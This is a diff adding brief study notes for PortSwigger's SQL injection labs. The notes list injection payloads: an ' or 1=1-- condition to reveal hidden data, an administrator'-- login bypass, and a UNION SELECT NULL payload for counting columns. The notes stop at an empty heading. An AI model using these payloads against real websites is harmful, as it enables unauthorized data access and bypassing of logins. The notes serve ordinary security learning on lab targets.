@@ -1,0 +1,28 @@
+
+
+https://portswigger.net/web-security/all-labs
+
+
+	<SQL Injection>
+	
+	
+	-SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+		
+		select * from customers where city = 'london'					|| show only city 
+		select * from customers where city = 'london' or 1=1--			|| or 1=1-- will return all city which means true
+		
+		w3schoolos.com/filter?category=Pets'+or+1=1--					|| will return all categories
+		
+		
+	- SQL injection vulnerability allowing login bypass
+		 
+		 modify the username parameter and giving it the value: administrator'-- 
+		 
+	
+	- SQL injection UNION attack (determining the number of columns returned by the query)
+	
+		return null values datab using this '+UNION+SELECT+NULL,NULL--
+		
+		
+	- SQL injection UNION attack (finding a column containing text)
+		
